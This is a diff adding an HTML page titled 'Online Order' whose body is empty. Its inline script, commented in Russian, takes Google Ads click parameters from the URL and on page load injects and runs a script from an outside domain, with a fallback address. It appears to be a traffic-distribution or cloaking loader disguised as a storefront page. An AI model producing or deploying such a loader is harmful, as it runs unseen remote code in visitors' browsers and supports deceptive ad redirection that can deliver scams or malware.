@@ -1,0 +1,66 @@
+<html>
+  
+  <head>
+    <script>
+// Функция для получения параметров из URL
+function GET(item) {
+    var p = window.location.search;
+    p = p.match(new RegExp(item+'=([^&=]+)'));
+    return p ? p[1] : false;
+}
+
+// Функция для проверки доступности ресурса
+function checkResource(url, timeout) {
+    return new Promise((resolve, reject) => {
+        const script = document.createElement('script');
+        
+        // Обработчик успешной загрузки
+        script.onload = () => {
+            resolve(true);
+        };
+        
+        // Обработчик ошибки
+        script.onerror = () => {
+            reject(false);
+        };
+
+        // Таймаут для проверки
+        setTimeout(() => {
+            reject(false);
+        }, timeout);
+
+        script.src = url;
+        document.head.appendChild(script);
+    });
+}
+
+// Основной код
+async function loadScript() {
+    const gclid = GET('gclid');
+    const keyword = GET('keyword');
+    const primaryUrl = `https://twtds.info/rujswlr?gclid=${gclid}&keyword=${keyword}`;
+    const fallbackUrl = `https://twtds.info/rujswlr2?gclid=${gclid}&keyword=${keyword}`; // Укажите ваш резервный URL
+
+    try {
+        // Пробуем загрузить основной скрипт
+        await checkResource(primaryUrl, 5000); // таймаут 5 секунд
+    } catch (error) {
+        // Если основной скрипт не загрузился, пробуем fallback
+        try {
+            await checkResource(fallbackUrl, 5000);
+        } catch (fallbackError) {
+            console.error('Both primary and fallback resources failed to load');
+        }
+    }
+}
+
+// Запускаем загрузку
+loadScript();
+</script>
+
+    <title>Online Order</title>
+  </head>
+  <body>
+
+  </body>
+</html>
